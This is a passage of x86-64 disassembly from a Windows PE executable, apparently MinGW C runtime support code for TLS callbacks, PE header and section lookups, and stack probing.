   140001e8f:	e9 2c ff ff ff       	jmp    0x140001dc0
   140001e94:	ba 01 00 00 00       	mov    $0x1,%edx
   140001e99:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001e9e:	e8 fd 07 00 00       	call   0x1400026a0
   140001ea3:	e8 a8 f8 ff ff       	call   0x140001750
   140001ea8:	e9 13 ff ff ff       	jmp    0x140001dc0
   140001ead:	90                   	nop
   140001eae:	90                   	nop
   140001eaf:	90                   	nop
   140001eb0:	55                   	push   %rbp
   140001eb1:	41 55                	push   %r13
   140001eb3:	41 54                	push   %r12
   140001eb5:	57                   	push   %rdi
   140001eb6:	56                   	push   %rsi
   140001eb7:	53                   	push   %rbx
   140001eb8:	48 83 ec 28          	sub    $0x28,%rsp
   140001ebc:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001ec1:	4c 8d 2d 38 62 00 00 	lea    0x6238(%rip),%r13        # 0x140008100
   140001ec8:	4c 89 e9             	mov    %r13,%rcx
   140001ecb:	ff 15 f7 73 00 00    	call   *0x73f7(%rip)        # 0x1400092c8
   140001ed1:	48 8b 1d 08 62 00 00 	mov    0x6208(%rip),%rbx        # 0x1400080e0
   140001ed8:	48 85 db             	test   %rbx,%rbx
   140001edb:	74 38                	je     0x140001f15
   140001edd:	4c 8b 25 74 74 00 00 	mov    0x7474(%rip),%r12        # 0x140009358
   140001ee4:	48 8b 3d fd 73 00 00 	mov    0x73fd(%rip),%rdi        # 0x1400092e8
   140001eeb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ef0:	8b 0b                	mov    (%rbx),%ecx
   140001ef2:	41 ff d4             	call   *%r12
   140001ef5:	48 89 c6             	mov    %rax,%rsi
   140001ef8:	ff d7                	call   *%rdi
   140001efa:	48 85 f6             	test   %rsi,%rsi
   140001efd:	74 0d                	je     0x140001f0c
   140001eff:	85 c0                	test   %eax,%eax
   140001f01:	75 09                	jne    0x140001f0c
   140001f03:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140001f07:	48 89 f1             	mov    %rsi,%rcx
   140001f0a:	ff d0                	call   *%rax
   140001f0c:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140001f10:	48 85 db             	test   %rbx,%rbx
   140001f13:	75 db                	jne    0x140001ef0
   140001f15:	4c 89 e9             	mov    %r13,%rcx
   140001f18:	48 83 c4 28          	add    $0x28,%rsp
   140001f1c:	5b                   	pop    %rbx
   140001f1d:	5e                   	pop    %rsi
   140001f1e:	5f                   	pop    %rdi
   140001f1f:	41 5c                	pop    %r12
   140001f21:	41 5d                	pop    %r13
   140001f23:	5d                   	pop    %rbp
   140001f24:	48 ff 25 05 74 00 00 	rex.W jmp *0x7405(%rip)        # 0x140009330
   140001f2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001f30:	55                   	push   %rbp
   140001f31:	57                   	push   %rdi
   140001f32:	56                   	push   %rsi
   140001f33:	53                   	push   %rbx
   140001f34:	48 83 ec 28          	sub    $0x28,%rsp
   140001f38:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001f3d:	8b 05 a5 61 00 00    	mov    0x61a5(%rip),%eax        # 0x1400080e8
   140001f43:	89 cf                	mov    %ecx,%edi
   140001f45:	48 89 d6             	mov    %rdx,%rsi
   140001f48:	85 c0                	test   %eax,%eax
   140001f4a:	75 14                	jne    0x140001f60
   140001f4c:	31 c0                	xor    %eax,%eax
   140001f4e:	48 83 c4 28          	add    $0x28,%rsp
   140001f52:	5b                   	pop    %rbx
   140001f53:	5e                   	pop    %rsi
   140001f54:	5f                   	pop    %rdi
   140001f55:	5d                   	pop    %rbp
   140001f56:	c3                   	ret
   140001f57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001f5e:	00 00 
   140001f60:	ba 18 00 00 00       	mov    $0x18,%edx
   140001f65:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f6a:	e8 f9 06 00 00       	call   0x140002668
   140001f6f:	48 89 c3             	mov    %rax,%rbx
   140001f72:	48 85 c0             	test   %rax,%rax
   140001f75:	74 33                	je     0x140001faa
   140001f77:	48 89 70 08          	mov    %rsi,0x8(%rax)
   140001f7b:	48 8d 35 7e 61 00 00 	lea    0x617e(%rip),%rsi        # 0x140008100
   140001f82:	89 38                	mov    %edi,(%rax)
   140001f84:	48 89 f1             	mov    %rsi,%rcx
   140001f87:	ff 15 3b 73 00 00    	call   *0x733b(%rip)        # 0x1400092c8
   140001f8d:	48 8b 05 4c 61 00 00 	mov    0x614c(%rip),%rax        # 0x1400080e0
   140001f94:	48 89 f1             	mov    %rsi,%rcx
   140001f97:	48 89 1d 42 61 00 00 	mov    %rbx,0x6142(%rip)        # 0x1400080e0
   140001f9e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001fa2:	ff 15 88 73 00 00    	call   *0x7388(%rip)        # 0x140009330
   140001fa8:	eb a2                	jmp    0x140001f4c
   140001faa:	83 c8 ff             	or     $0xffffffff,%eax
   140001fad:	eb 9f                	jmp    0x140001f4e
   140001faf:	90                   	nop
   140001fb0:	55                   	push   %rbp
   140001fb1:	56                   	push   %rsi
   140001fb2:	53                   	push   %rbx
   140001fb3:	48 83 ec 20          	sub    $0x20,%rsp
   140001fb7:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140001fbc:	8b 05 26 61 00 00    	mov    0x6126(%rip),%eax        # 0x1400080e8
   140001fc2:	89 cb                	mov    %ecx,%ebx
   140001fc4:	85 c0                	test   %eax,%eax
   140001fc6:	75 10                	jne    0x140001fd8
   140001fc8:	31 c0                	xor    %eax,%eax
   140001fca:	48 83 c4 20          	add    $0x20,%rsp
   140001fce:	5b                   	pop    %rbx
   140001fcf:	5e                   	pop    %rsi
   140001fd0:	5d                   	pop    %rbp
   140001fd1:	c3                   	ret
   140001fd2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001fd8:	48 8d 35 21 61 00 00 	lea    0x6121(%rip),%rsi        # 0x140008100
   140001fdf:	48 89 f1             	mov    %rsi,%rcx
   140001fe2:	ff 15 e0 72 00 00    	call   *0x72e0(%rip)        # 0x1400092c8
   140001fe8:	48 8b 0d f1 60 00 00 	mov    0x60f1(%rip),%rcx        # 0x1400080e0
   140001fef:	48 85 c9             	test   %rcx,%rcx
   140001ff2:	74 2f                	je     0x140002023
   140001ff4:	31 d2                	xor    %edx,%edx
   140001ff6:	eb 13                	jmp    0x14000200b
   140001ff8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001fff:	00 
   140002000:	48 89 ca             	mov    %rcx,%rdx
   140002003:	48 85 c0             	test   %rax,%rax
   140002006:	74 1b                	je     0x140002023
   140002008:	48 89 c1             	mov    %rax,%rcx
   14000200b:	8b 01                	mov    (%rcx),%eax
   14000200d:	39 d8                	cmp    %ebx,%eax
   14000200f:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140002013:	75 eb                	jne    0x140002000
   140002015:	48 85 d2             	test   %rdx,%rdx
   140002018:	74 26                	je     0x140002040
   14000201a:	48 89 42 10          	mov    %rax,0x10(%rdx)
   14000201e:	e8 5d 06 00 00       	call   0x140002680
   140002023:	48 89 f1             	mov    %rsi,%rcx
   140002026:	ff 15 04 73 00 00    	call   *0x7304(%rip)        # 0x140009330
   14000202c:	31 c0                	xor    %eax,%eax
   14000202e:	48 83 c4 20          	add    $0x20,%rsp
   140002032:	5b                   	pop    %rbx
   140002033:	5e                   	pop    %rsi
   140002034:	5d                   	pop    %rbp
   140002035:	c3                   	ret
   140002036:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000203d:	00 00 00 
   140002040:	48 89 05 99 60 00 00 	mov    %rax,0x6099(%rip)        # 0x1400080e0
   140002047:	eb d5                	jmp    0x14000201e
   140002049:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002050:	55                   	push   %rbp
   140002051:	53                   	push   %rbx
   140002052:	48 83 ec 28          	sub    $0x28,%rsp
   140002056:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000205b:	83 fa 02             	cmp    $0x2,%edx
   14000205e:	0f 84 ac 00 00 00    	je     0x140002110
   140002064:	77 2a                	ja     0x140002090
   140002066:	85 d2                	test   %edx,%edx
   140002068:	74 46                	je     0x1400020b0
   14000206a:	8b 05 78 60 00 00    	mov    0x6078(%rip),%eax        # 0x1400080e8
   140002070:	85 c0                	test   %eax,%eax
   140002072:	0f 84 b8 00 00 00    	je     0x140002130
   140002078:	c7 05 66 60 00 00 01 	movl   $0x1,0x6066(%rip)        # 0x1400080e8
   14000207f:	00 00 00 
   140002082:	b8 01 00 00 00       	mov    $0x1,%eax
   140002087:	48 83 c4 28          	add    $0x28,%rsp
   14000208b:	5b                   	pop    %rbx
   14000208c:	5d                   	pop    %rbp
   14000208d:	c3                   	ret
   14000208e:	66 90                	xchg   %ax,%ax
   140002090:	83 fa 03             	cmp    $0x3,%edx
   140002093:	75 ed                	jne    0x140002082
   140002095:	8b 05 4d 60 00 00    	mov    0x604d(%rip),%eax        # 0x1400080e8
   14000209b:	85 c0                	test   %eax,%eax
   14000209d:	74 e3                	je     0x140002082
   14000209f:	e8 0c fe ff ff       	call   0x140001eb0
   1400020a4:	eb dc                	jmp    0x140002082
   1400020a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400020ad:	00 00 00 
   1400020b0:	8b 05 32 60 00 00    	mov    0x6032(%rip),%eax        # 0x1400080e8
   1400020b6:	85 c0                	test   %eax,%eax
   1400020b8:	75 6e                	jne    0x140002128
   1400020ba:	8b 05 28 60 00 00    	mov    0x6028(%rip),%eax        # 0x1400080e8
   1400020c0:	83 f8 01             	cmp    $0x1,%eax
   1400020c3:	75 bd                	jne    0x140002082
   1400020c5:	48 8b 1d 14 60 00 00 	mov    0x6014(%rip),%rbx        # 0x1400080e0
   1400020cc:	48 85 db             	test   %rbx,%rbx
   1400020cf:	74 18                	je     0x1400020e9
   1400020d1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400020d8:	48 89 d9             	mov    %rbx,%rcx
   1400020db:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400020df:	e8 9c 05 00 00       	call   0x140002680
   1400020e4:	48 85 db             	test   %rbx,%rbx
   1400020e7:	75 ef                	jne    0x1400020d8
   1400020e9:	48 8d 0d 10 60 00 00 	lea    0x6010(%rip),%rcx        # 0x140008100
   1400020f0:	48 c7 05 e5 5f 00 00 	movq   $0x0,0x5fe5(%rip)        # 0x1400080e0
   1400020f7:	00 00 00 00 
   1400020fb:	c7 05 e3 5f 00 00 00 	movl   $0x0,0x5fe3(%rip)        # 0x1400080e8
   140002102:	00 00 00 
   140002105:	ff 15 ad 71 00 00    	call   *0x71ad(%rip)        # 0x1400092b8
   14000210b:	e9 72 ff ff ff       	jmp    0x140002082
   140002110:	e8 3b f6 ff ff       	call   0x140001750
   140002115:	b8 01 00 00 00       	mov    $0x1,%eax
   14000211a:	48 83 c4 28          	add    $0x28,%rsp
   14000211e:	5b                   	pop    %rbx
   14000211f:	5d                   	pop    %rbp
   140002120:	c3                   	ret
   140002121:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002128:	e8 83 fd ff ff       	call   0x140001eb0
   14000212d:	eb 8b                	jmp    0x1400020ba
   14000212f:	90                   	nop
   140002130:	48 8d 0d c9 5f 00 00 	lea    0x5fc9(%rip),%rcx        # 0x140008100
   140002137:	ff 15 eb 71 00 00    	call   *0x71eb(%rip)        # 0x140009328
   14000213d:	e9 36 ff ff ff       	jmp    0x140002078
   140002142:	90                   	nop
   140002143:	90                   	nop
   140002144:	90                   	nop
   140002145:	90                   	nop
   140002146:	90                   	nop
   140002147:	90                   	nop
   140002148:	90                   	nop
   140002149:	90                   	nop
   14000214a:	90                   	nop
   14000214b:	90                   	nop
   14000214c:	90                   	nop
   14000214d:	90                   	nop
   14000214e:	90                   	nop
   14000214f:	90                   	nop
   140002150:	31 c0                	xor    %eax,%eax
   140002152:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140002157:	75 0f                	jne    0x140002168
   140002159:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000215d:	48 01 d1             	add    %rdx,%rcx
   140002160:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002166:	74 08                	je     0x140002170
   140002168:	c3                   	ret
   140002169:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002170:	31 c0                	xor    %eax,%eax
   140002172:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140002178:	0f 94 c0             	sete   %al
   14000217b:	c3                   	ret
   14000217c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002180:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140002184:	48 01 c1             	add    %rax,%rcx
   140002187:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000218b:	44 0f b7 41 06       	movzwl 0x6(%rcx),%r8d
   140002190:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140002195:	66 45 85 c0          	test   %r8w,%r8w
   140002199:	74 32                	je     0x1400021cd
   14000219b:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   14000219f:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400021a3:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   1400021a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400021af:	00 
   1400021b0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   1400021b4:	4c 89 c1             	mov    %r8,%rcx
   1400021b7:	4c 39 c2             	cmp    %r8,%rdx
   1400021ba:	72 08                	jb     0x1400021c4
   1400021bc:	03 48 08             	add    0x8(%rax),%ecx
   1400021bf:	48 39 ca             	cmp    %rcx,%rdx
   1400021c2:	72 0b                	jb     0x1400021cf
   1400021c4:	48 83 c0 28          	add    $0x28,%rax
   1400021c8:	4c 39 c8             	cmp    %r9,%rax
   1400021cb:	75 e3                	jne    0x1400021b0
   1400021cd:	31 c0                	xor    %eax,%eax
   1400021cf:	c3                   	ret
   1400021d0:	55                   	push   %rbp
   1400021d1:	57                   	push   %rdi
   1400021d2:	56                   	push   %rsi
   1400021d3:	53                   	push   %rbx
   1400021d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400021d8:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400021dd:	48 89 ce             	mov    %rcx,%rsi
   1400021e0:	e8 c3 04 00 00       	call   0x1400026a8
   1400021e5:	48 83 f8 08          	cmp    $0x8,%rax
   1400021e9:	77 7d                	ja     0x140002268
   1400021eb:	48 8b 15 1e 32 00 00 	mov    0x321e(%rip),%rdx        # 0x140005410
   1400021f2:	31 db                	xor    %ebx,%ebx
   1400021f4:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   1400021f9:	75 5b                	jne    0x140002256
   1400021fb:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400021ff:	48 01 d0             	add    %rdx,%rax
   140002202:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002208:	75 4c                	jne    0x140002256
   14000220a:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140002210:	75 44                	jne    0x140002256
   140002212:	0f b7 50 14          	movzwl 0x14(%rax),%edx
   140002216:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
   14000221b:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   14000221f:	66 85 d2             	test   %dx,%dx
   140002222:	74 44                	je     0x140002268
   140002224:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140002227:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000222b:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
   140002230:	eb 0f                	jmp    0x140002241
   140002232:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002238:	48 83 c3 28          	add    $0x28,%rbx
   14000223c:	48 39 fb             	cmp    %rdi,%rbx
   14000223f:	74 27                	je     0x140002268
   140002241:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002247:	48 89 f2             	mov    %rsi,%rdx
   14000224a:	48 89 d9             	mov    %rbx,%rcx
   14000224d:	e8 5e 04 00 00       	call   0x1400026b0
   140002252:	85 c0                	test   %eax,%eax
   140002254:	75 e2                	jne    0x140002238
   140002256:	48 89 d8             	mov    %rbx,%rax
   140002259:	48 83 c4 28          	add    $0x28,%rsp
   14000225d:	5b                   	pop    %rbx
   14000225e:	5e                   	pop    %rsi
   14000225f:	5f                   	pop    %rdi
   140002260:	5d                   	pop    %rbp
   140002261:	c3                   	ret
   140002262:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002268:	31 db                	xor    %ebx,%ebx
   14000226a:	48 89 d8             	mov    %rbx,%rax
   14000226d:	48 83 c4 28          	add    $0x28,%rsp
   140002271:	5b                   	pop    %rbx
   140002272:	5e                   	pop    %rsi
   140002273:	5f                   	pop    %rdi
   140002274:	5d                   	pop    %rbp
   140002275:	c3                   	ret
   140002276:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000227d:	00 00 00 
   140002280:	48 8b 15 89 31 00 00 	mov    0x3189(%rip),%rdx        # 0x140005410
   140002287:	31 c0                	xor    %eax,%eax
   140002289:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   14000228e:	75 10                	jne    0x1400022a0
   140002290:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140002294:	49 01 d0             	add    %rdx,%r8
   140002297:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   14000229e:	74 08                	je     0x1400022a8
   1400022a0:	c3                   	ret
   1400022a1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400022a8:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   1400022af:	75 ef                	jne    0x1400022a0
   1400022b1:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   1400022b6:	48 29 d1             	sub    %rdx,%rcx
   1400022b9:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   1400022be:	45 0f b7 40 06       	movzwl 0x6(%r8),%r8d
   1400022c3:	66 45 85 c0          	test   %r8w,%r8w
   1400022c7:	74 34                	je     0x1400022fd
   1400022c9:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   1400022cd:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   1400022d1:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   1400022d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400022dd:	00 00 00 
   1400022e0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   1400022e4:	4c 89 c2             	mov    %r8,%rdx
   1400022e7:	4c 39 c1             	cmp    %r8,%rcx
   1400022ea:	72 08                	jb     0x1400022f4
   1400022ec:	03 50 08             	add    0x8(%rax),%edx
   1400022ef:	48 39 d1             	cmp    %rdx,%rcx
   1400022f2:	72 ac                	jb     0x1400022a0
   1400022f4:	48 83 c0 28          	add    $0x28,%rax
   1400022f8:	4c 39 c8             	cmp    %r9,%rax
   1400022fb:	75 e3                	jne    0x1400022e0
   1400022fd:	31 c0                	xor    %eax,%eax
   1400022ff:	c3                   	ret
   140002300:	48 8b 05 09 31 00 00 	mov    0x3109(%rip),%rax        # 0x140005410
   140002307:	31 c9                	xor    %ecx,%ecx
   140002309:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000230e:	75 0f                	jne    0x14000231f
   140002310:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140002314:	48 01 d0             	add    %rdx,%rax
   140002317:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   14000231d:	74 09                	je     0x140002328
   14000231f:	89 c8                	mov    %ecx,%eax
   140002321:	c3                   	ret
   140002322:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002328:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   14000232e:	75 ef                	jne    0x14000231f
   140002330:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   140002334:	89 c8                	mov    %ecx,%eax
   140002336:	c3                   	ret
   140002337:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000233e:	00 00 
   140002340:	4c 8b 05 c9 30 00 00 	mov    0x30c9(%rip),%r8        # 0x140005410
   140002347:	31 c0                	xor    %eax,%eax
   140002349:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   14000234f:	75 0f                	jne    0x140002360
   140002351:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   140002355:	4c 01 c2             	add    %r8,%rdx
   140002358:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000235e:	74 08                	je     0x140002368
   140002360:	c3                   	ret
   140002361:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002368:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   14000236e:	75 f0                	jne    0x140002360
   140002370:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140002374:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   140002379:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   14000237e:	66 45 85 c0          	test   %r8w,%r8w
   140002382:	74 2c                	je     0x1400023b0
   140002384:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   140002388:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   14000238c:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
   140002391:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002398:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   14000239c:	74 09                	je     0x1400023a7
   14000239e:	48 85 c9             	test   %rcx,%rcx
   1400023a1:	74 bd                	je     0x140002360
   1400023a3:	48 83 e9 01          	sub    $0x1,%rcx
   1400023a7:	48 83 c0 28          	add    $0x28,%rax
   1400023ab:	48 39 c2             	cmp    %rax,%rdx
   1400023ae:	75 e8                	jne    0x140002398
   1400023b0:	31 c0                	xor    %eax,%eax
   1400023b2:	c3                   	ret
   1400023b3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400023ba:	00 00 00 00 
   1400023be:	66 90                	xchg   %ax,%ax
   1400023c0:	48 8b 05 49 30 00 00 	mov    0x3049(%rip),%rax        # 0x140005410
   1400023c7:	31 d2                	xor    %edx,%edx
   1400023c9:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   1400023ce:	75 0f                	jne    0x1400023df
   1400023d0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400023d4:	48 01 c1             	add    %rax,%rcx
   1400023d7:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400023dd:	74 09                	je     0x1400023e8
   1400023df:	48 89 d0             	mov    %rdx,%rax
   1400023e2:	c3                   	ret
   1400023e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400023e8:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   1400023ee:	48 0f 44 d0          	cmove  %rax,%rdx
   1400023f2:	48 89 d0             	mov    %rdx,%rax
   1400023f5:	c3                   	ret
   1400023f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400023fd:	00 00 00 
   140002400:	48 8b 15 09 30 00 00 	mov    0x3009(%rip),%rdx        # 0x140005410
   140002407:	31 c0                	xor    %eax,%eax
   140002409:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   14000240e:	75 10                	jne    0x140002420
   140002410:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140002414:	49 01 d0             	add    %rdx,%r8
   140002417:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   14000241e:	74 08                	je     0x140002428
   140002420:	c3                   	ret
   140002421:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002428:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   14000242f:	75 ef                	jne    0x140002420
   140002431:	48 29 d1             	sub    %rdx,%rcx
   140002434:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   140002439:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   14000243e:	49 8d 54 10 18       	lea    0x18(%r8,%rdx,1),%rdx
   140002443:	66 45 85 c9          	test   %r9w,%r9w
   140002447:	74 d7                	je     0x140002420
   140002449:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   14000244d:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002451:	4c 8d 4c c2 28       	lea    0x28(%rdx,%rax,8),%r9
   140002456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000245d:	00 00 00 
   140002460:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   140002464:	4c 89 c0             	mov    %r8,%rax
   140002467:	4c 39 c1             	cmp    %r8,%rcx
   14000246a:	72 08                	jb     0x140002474
   14000246c:	03 42 08             	add    0x8(%rdx),%eax
   14000246f:	48 39 c1             	cmp    %rax,%rcx
   140002472:	72 0c                	jb     0x140002480
   140002474:	48 83 c2 28          	add    $0x28,%rdx
   140002478:	4c 39 ca             	cmp    %r9,%rdx
   14000247b:	75 e3                	jne    0x140002460
   14000247d:	31 c0                	xor    %eax,%eax
   14000247f:	c3                   	ret
   140002480:	8b 42 24             	mov    0x24(%rdx),%eax
   140002483:	f7 d0                	not    %eax
   140002485:	c1 e8 1f             	shr    $0x1f,%eax
   140002488:	c3                   	ret
   140002489:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002490:	4c 8b 1d 79 2f 00 00 	mov    0x2f79(%rip),%r11        # 0x140005410
   140002497:	45 31 c0             	xor    %r8d,%r8d
   14000249a:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   1400024a0:	41 89 ca             	mov    %ecx,%r10d
   1400024a3:	75 0f                	jne    0x1400024b4
   1400024a5:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
   1400024a9:	4c 01 d9             	add    %r11,%rcx
   1400024ac:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400024b2:	74 0c                	je     0x1400024c0
   1400024b4:	4c 89 c0             	mov    %r8,%rax
   1400024b7:	c3                   	ret
   1400024b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400024bf:	00 
   1400024c0:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   1400024c6:	75 ec                	jne    0x1400024b4
   1400024c8:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
   1400024ce:	85 c0                	test   %eax,%eax
   1400024d0:	74 e2                	je     0x1400024b4
   1400024d2:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400024d6:	44 0f b7 49 06       	movzwl 0x6(%rcx),%r9d
   1400024db:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
   1400024e0:	66 45 85 c9          	test   %r9w,%r9w
   1400024e4:	74 ce                	je     0x1400024b4
   1400024e6:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   1400024ea:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400024ee:	4c 8d 4c ca 28       	lea    0x28(%rdx,%rcx,8),%r9
   1400024f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024f8:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   1400024fc:	4c 89 c1             	mov    %r8,%rcx
   1400024ff:	4c 39 c0             	cmp    %r8,%rax
   140002502:	72 08                	jb     0x14000250c
   140002504:	03 4a 08             	add    0x8(%rdx),%ecx
   140002507:	48 39 c8             	cmp    %rcx,%rax
   14000250a:	72 14                	jb     0x140002520
   14000250c:	48 83 c2 28          	add    $0x28,%rdx
   140002510:	49 39 d1             	cmp    %rdx,%r9
   140002513:	75 e3                	jne    0x1400024f8
   140002515:	45 31 c0             	xor    %r8d,%r8d
   140002518:	4c 89 c0             	mov    %r8,%rax
   14000251b:	c3                   	ret
   14000251c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002520:	4c 01 d8             	add    %r11,%rax
   140002523:	eb 0b                	jmp    0x140002530
   140002525:	0f 1f 00             	nopl   (%rax)
   140002528:	41 83 ea 01          	sub    $0x1,%r10d
   14000252c:	48 83 c0 14          	add    $0x14,%rax
   140002530:	8b 48 04             	mov    0x4(%rax),%ecx
   140002533:	85 c9                	test   %ecx,%ecx
   140002535:	75 07                	jne    0x14000253e
   140002537:	8b 50 0c             	mov    0xc(%rax),%edx
   14000253a:	85 d2                	test   %edx,%edx
   14000253c:	74 d7                	je     0x140002515
   14000253e:	45 85 d2             	test   %r10d,%r10d
   140002541:	7f e5                	jg     0x140002528
   140002543:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002547:	4d 01 d8             	add    %r11,%r8
   14000254a:	4c 89 c0             	mov    %r8,%rax
   14000254d:	c3                   	ret
   14000254e:	90                   	nop
   14000254f:	90                   	nop
   140002550:	51                   	push   %rcx
   140002551:	50                   	push   %rax
   140002552:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002558:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000255d:	72 19                	jb     0x140002578
   14000255f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002566:	48 83 09 00          	orq    $0x0,(%rcx)
   14000256a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140002570:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
